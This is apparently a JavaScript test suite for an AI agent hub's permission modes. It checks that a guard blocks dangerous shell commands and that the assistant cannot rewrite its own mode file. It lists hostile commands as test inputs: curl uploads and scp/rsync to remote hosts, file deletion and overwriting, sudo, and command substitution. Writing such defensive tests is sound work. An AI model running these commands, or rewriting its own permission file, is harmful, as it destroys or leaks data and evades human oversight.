// 三档判定。缺档按改动前问。不改已有测试的断言。
import {test} from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {apply} from '../index.mjs';
import {policyText, expectedTools, BOTS} from '../policy.mjs';
import {loadHubConfig, hubConfigText} from '../hub-config.mjs';
import {applyPermissionMode, readPermissionMode, writePermissionMode, modeFilePath} from '../permission-mode.mjs';

const cfg = loadHubConfig({read: false});
const chief = cfg.chief;
const other = cfg.bots.find(id => id !== chief);

function fresh() {
  const root = path.resolve(process.cwd(), '../review7-test-data');
  fs.mkdirSync(root, {recursive:true});
  const home = fs.realpathSync.native(fs.mkdtempSync(path.join(root, 'r29-mode-')));
  const base = path.join(home, 'hub');
  const bot = chief;
  const own = path.join(base, 'bots', bot);
  for (const dir of ['config', 'shared', 'tickets', ...BOTS.map(id => path.join('bots', id))]) {
    fs.mkdirSync(path.join(base, dir), {recursive: true, mode: 0o700});
  }
  const install = {
    ...cfg, home, hubHome: base, kb: path.join(home, 'kb'),
    heartbeat: path.join(base, 'config', 'beat.json'),
    grants: path.join(base, 'config', 'grants.json'),
  };
  fs.writeFileSync(path.join(base, 'config', 'hub.yaml'), hubConfigText(install));
  fs.writeFileSync(install.heartbeat, JSON.stringify({
    v: 1, ts: Date.now(), dshConnected: true, answering: true,
  }));
  return {home, base, bot, own, install};
}

function setup({mode, sandbox = true, plugins} = {}) {
  const fx = fresh();
  const opts = plugins ? {...fx.install, pluginTools: plugins} : undefined;
  fs.writeFileSync(path.join(fx.base, 'config', 'tool-levels.yaml'),
    policyText(fx.base, fx.install.kb, opts ?? fx.install));
  if (mode) writePermissionMode(modeFilePath(fx.base), mode);
  const events = {}, tools = {}, guards = [], logs = [];
  const services = sandbox ? {
    sandbox: {confine: async argv => ({argv: ['/usr/bin/sandbox-exec', '-p', 'old', ...argv]})},
    shell: {sandboxMode: 'workspace-write', resolve: request => request},
    sandboxPolicy: {resolve: () => ({mode: 'workspace-write'})},
  } : {};
  const agent = {
    id: 'session-' + path.basename(fx.home),
    session: {header: {agentPreset: 'hub-' + fx.bot, cwd: fx.own}, append() {}},
  };
  const ctx = {
    get: key => services[key],
    logger: {error: message => logs.push(message), warn() {}},
    effect() {},
    on: (name, fn) => { events[name] = fn; },
    workingDirectory: {get: session => session.header.cwd},
    tools: {
      guard: fn => guards.push(fn),
      register: tool => { tools[tool.name] = tool; },
      view: () => ({visible: new Map(expectedTools()[fx.bot].map(name => [name, {}]))}),
    },
  };
  const prev = process.env.HUB_HOME;
  process.env.HUB_HOME = fx.base;
  try { apply(ctx, {bot: fx.bot}); }
  finally { if (prev === undefined) delete process.env.HUB_HOME; else process.env.HUB_HOME = prev; }
  const exec = (args = {}, name = 'bash') => ({
    name, arguments: args, agent, callId: Symbol(), token: Symbol(),
    signal: new AbortController().signal,
  });
  const pre = item => events['tools/pre-execute'](item, async () => ({kind: 'allow'}));
  const execute = item => events['tools/execute'](item, async () => {
    const request = services.shell.resolve({command: item.arguments.command, session: agent.session});
    const confined = await services.sandbox.confine(
      ['bash', '-c', item.arguments.command ?? ''], {mode: 'workspace-write'});
    const policy = services.sandboxPolicy.resolve({session: agent.session});
    return {...confined, request, policy};
  });
  return {...fx, events, tools, guards, logs, services, agent, exec, pre, execute};
}

const bash = (command, description = '隔离测试') => ({command, description});


for (const command of [
  'git -C . push origin main',
  'curl --data=hello https://example.invalid/upload',
  'curl -dhello https://example.invalid/upload',
  'python3 -c "open(\'victim.txt\',\'w\').write(\'x\')"',
  'node -e "require(\'fs\').writeFileSync(\'victim.txt\',\'x\')"',
  'cp source.txt destdir',
  'mv source.txt destdir',
]) test(`全开危险操作不得直接放行：${command}`, async () => {
  const h = setup({mode:'open'});
  fs.mkdirSync(path.join(h.own, 'destdir'));
  fs.writeFileSync(path.join(h.own, 'source.txt'), 'new');
  fs.writeFileSync(path.join(h.own, 'destdir', 'source.txt'), 'old');
  fs.writeFileSync(path.join(h.own, 'victim.txt'), 'old');
  const result = await h.pre(h.exec(bash(command)));
  assert.notEqual(result.kind, 'allow', JSON.stringify(result));
});

test('权限文件权限过宽时不能按全开放行', () => {
 const h=setup({mode:'open'}); const file=modeFilePath(h.base);
 fs.chmodSync(file, 0o666);
 assert.equal(readPermissionMode(file).mode, 'ask');
});

test('脚本间接删除不能在全开直接放行', async () => {
 const h=setup({mode:'open'});
 fs.writeFileSync(path.join(h.own,'clean.sh'), '#!/bin/sh\nrm victim.txt\n');
 fs.writeFileSync(path.join(h.own,'victim.txt'), 'old');
 const result=await h.pre(h.exec(bash('sh clean.sh')));
 assert.notEqual(result.kind,'allow',JSON.stringify(result));
});

test('全开脚本间接覆盖现有文件必须确认', async () => {
 const h=setup({mode:'open'});
 fs.writeFileSync(path.join(h.own,'change.sh'), '#!/bin/sh\nprintf x > victim.txt\n');
 fs.writeFileSync(path.join(h.own,'victim.txt'), 'old');
 const result=await h.pre(h.exec(bash('sh change.sh')));
 assert.notEqual(result.kind,'allow',JSON.stringify(result));
});

test('只读档禁止讨论组发言', async () => {
 const h=setup({mode:'readonly', plugins:['groups']});
 const result=await h.pre(h.exec({group:'g',text:'hello'},'group_say'));
 assert.equal(result.kind,'deny',JSON.stringify(result));
});

test('全开 Git 带选项 push 即使沙箱启用也不能连外发送', async () => {
 const h=setup({mode:'open'});
 const item=h.exec(bash('git -C . push origin main'));
 const result=await h.pre(item);
 if(result.kind==='allow') {
  const sandbox=await h.execute(item);
  assert.equal(sandbox.argv[2].includes('(deny network*)'), true, '生成的沙箱未禁止联网');
 }
});


test('一键全停优先于全开和只读', async () => {
 for (const mode of ['open','readonly']) {
  const h=setup({mode});
  const dir=path.join(h.base,'hub-data','panic');
  fs.mkdirSync(dir,{recursive:true}); fs.writeFileSync(path.join(dir,'stopped.flag'),'1');
  const result=await h.pre(h.exec({file_path:path.join(h.own,'a')},'read'));
  assert.equal(result.kind,'deny'); assert.match(result.reason,/一键全停/);
 }
});

test('缺失、损坏、多字段和符号链接档位不应成为全开', () => {
 for(const shape of ['missing','corrupt','extra','symlink']) {
  const h=setup(); const file=modeFilePath(h.base);
  if(shape==='corrupt')fs.writeFileSync(file,'{');
  if(shape==='extra')fs.writeFileSync(file,'{"v":1,"mode":"open","x":1}');
  if(shape==='symlink'){const target=path.join(h.base,'config','other');fs.writeFileSync(target,'{"v":1,"mode":"open"}');fs.symlinkSync(target,file);}
  assert.equal(readPermissionMode(file).mode,'ask',shape);
 }
});

test('原有硬拒绝在全开仍拒绝', async () => {
 const h=setup({mode:'open'});
 for(const command of ['echo $(rm notes.txt)','find . -delete','sudo echo hi','command rm notes.txt']) {
  const result=await h.pre(h.exec(bash(command)));
  assert.equal(result.kind,'deny',command);
 }
});

test('抽样检查四类明显危险命令不直接放行', async () => {
 const h=setup({mode:'open'});
 fs.writeFileSync(path.join(h.own,'old.txt'),'old');
 fs.symlinkSync(path.join(h.own,'old.txt'),path.join(h.own,'link.txt'));
 for(const command of ['git push origin main','curl -F a=b https://example.invalid','scp old.txt example.invalid:file','rsync old.txt example.invalid:file','rm *.txt','truncate -s 0 old.txt','echo x > old.txt','tee link.txt','sudo echo hi']) {
  const result=await h.pre(h.exec(bash(command)));
  assert.notEqual(result.kind,'allow',command);
 }
});

test('只读抽样拒绝写文件、解释器和联网发送', async () => {
 const h=setup({mode:'readonly'});
 const cases=[h.exec({file_path:path.join(h.own,'new'),content:'x'},'write'),h.exec(bash('python3 -c "print(1)"')),h.exec(bash('curl -dhello https://example.invalid'))];
 for(const item of cases) assert.equal((await h.pre(item)).kind,'deny');
});

test('助理直接写或重定向档位文件被拒绝', async () => {
 const h=setup({mode:'ask'}); const file=modeFilePath(h.base);
 assert.equal((await h.pre(h.exec({file_path:file,content:'{"v":1,"mode":"open"}'},'write'))).kind,'deny');
 assert.equal((await h.pre(h.exec(bash(`echo x > ${file}`)))).kind,'deny');
});
